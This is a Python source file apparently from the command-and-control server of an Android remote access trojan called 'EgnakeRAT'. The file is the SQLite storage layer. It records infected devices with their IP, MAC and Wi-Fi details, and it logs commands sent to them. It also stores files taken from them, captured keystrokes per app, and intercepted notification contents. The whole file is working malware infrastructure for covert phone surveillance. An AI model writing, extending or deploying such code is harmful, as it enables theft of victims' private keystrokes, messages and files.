import sqlite3
import os
import threading
from datetime import datetime

DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "EgnakeRAT.db")


class Database:
    _local = threading.local()

    def __init__(self, db_path: str = None):
        self.db_path = db_path or DB_PATH
        self._init_db()

    def _get_conn(self) -> sqlite3.Connection:
        if not hasattr(self._local, "conn") or self._local.conn is None:
            self._local.conn = sqlite3.connect(self.db_path, check_same_thread=False)
            self._local.conn.row_factory = sqlite3.Row
            self._local.conn.execute("PRAGMA journal_mode=WAL")
            self._local.conn.execute("PRAGMA busy_timeout=5000")
        return self._local.conn

    def _init_db(self):
        conn = self._get_conn()
        conn.executescript("""
            CREATE TABLE IF NOT EXISTS devices (
                device_id TEXT PRIMARY KEY,
                model TEXT,
                manufacturer TEXT,
                android_version TEXT,
                ip_address TEXT,
                mac_address TEXT,
                first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                is_online INTEGER DEFAULT 1,
                battery_level INTEGER DEFAULT -1,
                wifi_ssid TEXT DEFAULT '',
                country TEXT DEFAULT ''
            );
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT NOT NULL,
                command TEXT NOT NULL,
                args TEXT DEFAULT '{}',
                status TEXT DEFAULT 'pending',
                response TEXT DEFAULT '',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                completed_at TIMESTAMP,
                FOREIGN KEY (device_id) REFERENCES devices(device_id)
            );
            CREATE TABLE IF NOT EXISTS files (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT NOT NULL,
                filename TEXT NOT NULL,
                file_type TEXT DEFAULT 'unknown',
                file_path TEXT NOT NULL,
                file_size INTEGER DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (device_id) REFERENCES devices(device_id)
            );
            CREATE TABLE IF NOT EXISTS sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT NOT NULL,
                ip_address TEXT,
                connected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                disconnected_at TIMESTAMP,
                FOREIGN KEY (device_id) REFERENCES devices(device_id)
            );
            CREATE TABLE IF NOT EXISTS keylogs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT NOT NULL,
                app_name TEXT DEFAULT '',
                text TEXT DEFAULT '',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (device_id) REFERENCES devices(device_id)
            );
            CREATE TABLE IF NOT EXISTS notifications (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT NOT NULL,
                package_name TEXT DEFAULT '',
                title TEXT DEFAULT '',
                content TEXT DEFAULT '',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (device_id) REFERENCES devices(device_id)
            );
        """)
        conn.commit()

    def upsert_device(self, device_id, model="", manufacturer="",
                      android_version="", ip_address="",
                      battery_level=-1, wifi_ssid=""):
        conn = self._get_conn()
        conn.execute("""
            INSERT INTO devices (device_id, model, manufacturer, android_version,
                                 ip_address, battery_level, wifi_ssid, is_online, last_seen)
            VALUES (?, ?, ?, ?, ?, ?, ?, 1, CURRENT_TIMESTAMP)
            ON CONFLICT(device_id) DO UPDATE SET
                model=excluded.model,
                android_version=excluded.android_version,
                ip_address=excluded.ip_address,
                battery_level=excluded.battery_level,
                wifi_ssid=excluded.wifi_ssid,
                is_online=1,
                last_seen=CURRENT_TIMESTAMP
        """, (device_id, model, manufacturer, android_version, ip_address,
              battery_level, wifi_ssid))
        conn.commit()

    def set_device_offline(self, device_id):
        conn = self._get_conn()
        conn.execute("UPDATE devices SET is_online=0 WHERE device_id=?", (device_id,))
        conn.commit()

    def get_all_devices(self):
        conn = self._get_conn()
        rows = conn.execute("SELECT * FROM devices ORDER BY last_seen DESC").fetchall()
        return [dict(r) for r in rows]

    def get_device(self, device_id):
        conn = self._get_conn()
        row = conn.execute("SELECT * FROM devices WHERE device_id=?", (device_id,)).fetchone()
        return dict(row) if row else {}

    def get_online_devices(self):
        conn = self._get_conn()
        rows = conn.execute("SELECT * FROM devices WHERE is_online=1 ORDER BY last_seen DESC").fetchall()
        return [dict(r) for r in rows]

    def log_command(self, device_id, command, args="{}"):
        conn = self._get_conn()
        cur = conn.execute(
            "INSERT INTO command_history (device_id, command, args) VALUES (?, ?, ?)",
            (device_id, command, args))
        conn.commit()
        return cur.lastrowid

    def update_command(self, cmd_id, status, response=""):
        conn = self._get_conn()
        conn.execute(
            "UPDATE command_history SET status=?, response=?, completed_at=CURRENT_TIMESTAMP WHERE id=?",
            (status, response, cmd_id))
        conn.commit()

    def get_command_history(self, device_id, limit=50):
        conn = self._get_conn()
        rows = conn.execute(
            "SELECT * FROM command_history WHERE device_id=? ORDER BY created_at DESC LIMIT ?",
            (device_id, limit)).fetchall()
        return [dict(r) for r in rows]

    def log_file(self, device_id, filename, file_type, file_path, file_size=0):
        conn = self._get_conn()
        conn.execute(
            "INSERT INTO files (device_id, filename, file_type, file_path, file_size) VALUES (?, ?, ?, ?, ?)",
            (device_id, filename, file_type, file_path, file_size))
        conn.commit()

    def get_files(self, device_id, file_type=None):
        conn = self._get_conn()
        if file_type:
            rows = conn.execute(
                "SELECT * FROM files WHERE device_id=? AND file_type=? ORDER BY created_at DESC",
                (device_id, file_type)).fetchall()
        else:
            rows = conn.execute(
                "SELECT * FROM files WHERE device_id=? ORDER BY created_at DESC",
                (device_id,)).fetchall()
        return [dict(r) for r in rows]

    def start_session(self, device_id, ip_address):
        conn = self._get_conn()
        cur = conn.execute(
            "INSERT INTO sessions (device_id, ip_address) VALUES (?, ?)",
            (device_id, ip_address))
        conn.commit()
        return cur.lastrowid

    def end_session(self, session_id):
        conn = self._get_conn()
        conn.execute(
            "UPDATE sessions SET disconnected_at=CURRENT_TIMESTAMP WHERE id=?",
            (session_id,))
        conn.commit()

    def log_keylog(self, device_id, app_name, text):
        conn = self._get_conn()
        conn.execute(
            "INSERT INTO keylogs (device_id, app_name, text) VALUES (?, ?, ?)",
            (device_id, app_name, text))
        conn.commit()

    def get_keylogs(self, device_id, limit=200):
        conn = self._get_conn()
        rows = conn.execute(
            "SELECT * FROM keylogs WHERE device_id=? ORDER BY created_at DESC LIMIT ?",
            (device_id, limit)).fetchall()
        return [dict(r) for r in rows]

    def log_notification(self, device_id, package_name, title, content):
        conn = self._get_conn()
        conn.execute(
            "INSERT INTO notifications (device_id, package_name, title, content) VALUES (?, ?, ?, ?)",
            (device_id, package_name, title, content))
        conn.commit()

    def get_notifications(self, device_id, limit=200):
        conn = self._get_conn()
        rows = conn.execute(
            "SELECT * FROM notifications WHERE device_id=? ORDER BY created_at DESC LIMIT ?",
            (device_id, limit)).fetchall()
        return [dict(r) for r in rows]

    def get_stats(self):
        conn = self._get_conn()
        total = conn.execute("SELECT COUNT(*) FROM devices").fetchone()[0]
        online = conn.execute("SELECT COUNT(*) FROM devices WHERE is_online=1").fetchone()[0]
        total_cmds = conn.execute("SELECT COUNT(*) FROM command_history").fetchone()[0]
        total_files = conn.execute("SELECT COUNT(*) FROM files").fetchone()[0]
        total_keylogs = conn.execute("SELECT COUNT(*) FROM keylogs").fetchone()[0]
        total_notifs = conn.execute("SELECT COUNT(*) FROM notifications").fetchone()[0]
        return {
            "total_devices": total,
            "online_devices": online,
            "total_commands": total_cmds,
            "total_files": total_files,
            "total_keylogs": total_keylogs,
            "total_notifications": total_notifs
        }
